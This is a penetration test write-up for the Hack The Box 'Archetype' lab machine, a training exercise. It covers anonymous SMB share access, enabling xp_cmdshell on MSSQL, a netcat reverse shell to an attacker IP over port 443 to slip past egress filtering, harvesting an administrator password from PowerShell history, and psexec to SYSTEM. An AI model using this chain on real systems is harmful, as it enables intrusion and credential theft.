# Penetration Test Report: Hack The Box - Archetype

## Executive Summary

This report details the penetration test of the "Archetype" machine on the Hack The Box platform. The assessment identified a misconfigured Server Message Block (SMB) share that exposed database credentials. These credentials were used to authenticate to a Microsoft SQL Server (MSSQL), where elevated privileges allowed for command execution and the deployment of a reverse shell. Subsequent local enumeration revealed plaintext Administrator credentials stored within a PowerShell history file, resulting in full system compromise (SYSTEM-level access).

## Reconnaissance & Enumeration

The engagement began with a comprehensive network scan using `nmap` to identify exposed services on the Windows target.

**Key Open Ports:**

* **Port 135 (MSRPC):** Microsoft Remote Procedure Call.
* **Port 139 / 445 (SMB):** Server Message Block.
* **Port 1433 (MSSQL):** Microsoft SQL Server 2017.

### SMB Enumeration

Given the presence of SMB, anonymous authentication (Null Session) was tested to identify misconfigured network shares. The `smbclient` tool successfully listed the shares, revealing a non-default share named `backups`.

Connecting to the `backups` share anonymously granted read access. Exploring the directory structure yielded a sensitive configuration file named `prod.dtsConfig`.
Upon reviewing the contents of this file, hardcoded plaintext credentials for the SQL service account were discovered:

* **Username:** `sql_svc`
* **Password:** `M3g4c0rp123`

## Initial Access & Web Exploitation

With valid credentials acquired, the Impacket tool suite (specifically `mssqlclient.py`) was utilized to authenticate to the MSSQL database on port 1433 via Windows Authentication.

### Enabling Command Execution

Once authenticated, the `sql_svc` account was found to have sufficient privileges to enable the `xp_cmdshell` extended stored procedure, which allows for the execution of operating system commands directly from the SQL query environment.

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;


### Weaponization & Reverse Shell

To establish an interactive foothold, a 64-bit Netcat executable (`nc64.exe`) was hosted on a local Python HTTP server. The payload was fetched by the target machine using PowerShell's `Invoke-WebRequest` command and saved to the universally accessible `C:\Users\Public\` directory.

> **Analyst Note - Egress Filtering Bypass:**
> Initial attempts to execute the reverse shell over arbitrary high-numbered ports (e.g., 1337) failed due to strict outbound firewall rules (Egress Filtering) on the Windows target. To bypass this defensive mechanism, the payload was reconfigured to establish an outbound connection over **Port 443 (HTTPS)**, which is typically permitted through corporate firewalls to allow normal web traffic.

The Netcat payload was executed via `xp_cmdshell`:

xp_cmdshell "C:\Users\Public\nc64.exe -e cmd.exe 10.10.15.3 443"


This successfully established a reverse shell connection, granting interactive command-line access as the `sql_svc` user and allowing for the retrieval of `user.txt`.

## Privilege Escalation

Operating as the standard user `sql_svc`, local enumeration was conducted to identify privilege escalation vectors. Absolute paths were utilized to navigate the file system to avoid relative path errors in the restricted shell environment.

Analysis of the user's hidden `AppData` directory revealed the presence of a PowerShell history file:
`C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Reviewing this history file exposed commands previously run by the administrator, including a command that mapped a network drive using plaintext administrative credentials:

* **Username:** `administrator`
* **Password:** `MEGACORP_4dm1n!!`

### Root Compromise

Armed with the local administrator's password, lateral movement and privilege escalation were achieved simultaneously. The Impacket `psexec.py` script was leveraged to authenticate to the target machine over SMB using the newly discovered credentials.

impacket-psexec administrator@10.129.8.185


This authenticated session successfully spawned a shell as `NT AUTHORITY\SYSTEM`, granting full administrative control over the Archetype server and allowing for the retrieval of `root.txt`.